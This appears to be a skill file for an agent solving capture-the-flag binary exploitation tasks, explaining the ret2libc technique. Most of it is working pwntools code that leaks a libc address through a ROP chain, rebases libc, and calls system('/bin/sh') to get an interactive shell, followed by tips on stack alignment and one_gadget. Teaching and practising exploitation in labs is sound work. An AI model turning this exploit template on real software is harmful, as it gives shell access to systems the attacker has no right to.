---
name: ret2libc
when: stack overflow, NX enabled, you can leak a libc address
tools: [python_exec]
phase: exploit
---
# ret2libc

NX means no shellcode on the stack; return into libc instead. Two stages:

Stage 1 - leak a libc address (defeat ASLR). Use a ROP chain that prints a known GOT entry:
```python
from pwn import *
elf = context.binary = ELF('/workspace/vuln'); libc = ELF('/workspace/libc.so.6')
io = process('/workspace/vuln')
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]                  # stack alignment for movaps
off = 40                                                # from cyclic
chain = flat(b'A'*off, pop_rdi, elf.got['puts'], elf.plt['puts'], elf.symbols['main'])
io.sendlineafter(b'> ', chain)
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']             # rebase libc
log.success('libc base %#x', libc.address)
```
Stage 2 - return to main (done above), then send a second chain to call system("/bin/sh"):
```python
binsh = next(libc.search(b'/bin/sh'))
chain2 = flat(b'A'*off, ret, pop_rdi, binsh, libc.symbols['system'])
io.sendlineafter(b'> ', chain2)
io.interactive()   # then: cat flag
```
Pitfalls: add a bare `ret` before `system` to fix `movaps` stack alignment (SIGSEGV in do_system).
If you cannot leak, try `one_gadget ./libc.so.6` for a single-shot execve (see `libc-id-and-leak`).
